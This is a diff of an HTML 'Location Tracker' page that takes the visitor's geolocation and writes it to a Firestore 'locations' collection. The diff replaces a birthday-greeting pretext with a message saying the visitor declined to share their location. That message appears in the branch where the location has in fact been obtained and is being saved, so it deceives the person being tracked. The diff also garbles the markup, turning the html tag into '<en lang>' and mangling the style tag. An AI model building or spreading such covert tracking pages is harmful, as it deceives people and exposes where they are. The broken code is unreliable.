@@ -1,13 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
+<en lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Location Tracker</title>
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<style>
-html,body,#map{height:100%;margin:0}
+<ststylehtml,body,#map{height:100%;margin:0}
 #panel{position:absolute;z-index:1000;top:10px;left:10px;background:#fff;padding:10px;border-radius:8px;max-width:320px;font-family:Arial}
 </style>
 </head>
@@ -54,9 +53,9 @@ navigator.geolocation.getCurrentPosition(
     map.setView([latitude, longitude], 17);
 
     status.innerHTML = `
-      <h3>🎂 Happy Birthday! 🎉</h3>
-      <p>May your day be filled with happiness and wonderful memories! ❤️</p>
-    `;
+  <h3>Location wasn't shared</h3>
+  <p>You chose not to share your location. You can reload the page and allow access if you'd like to use the location-based features.</p>
+`;
 
     try {
       await addDoc(collection(db, "locations"), {
